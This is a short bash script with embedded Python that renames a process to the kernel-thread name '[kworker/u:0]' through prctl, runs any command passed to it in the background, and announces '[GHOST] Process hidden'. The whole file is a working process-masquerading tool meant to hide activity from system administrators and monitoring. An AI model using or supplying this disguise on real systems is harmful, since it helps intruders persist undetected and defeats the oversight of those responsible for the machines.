#!/bin/bash
python3 -c "
import ctypes, os, sys
try:
    libc = ctypes.CDLL(None)
    libc.prctl(15, b'[kworker/u:0]', 0, 0, 0)
except: pass
os.system(' '.join(sys.argv[1:]))
" "$@" &
echo "[GHOST] Process hidden as [kworker/u:0]"
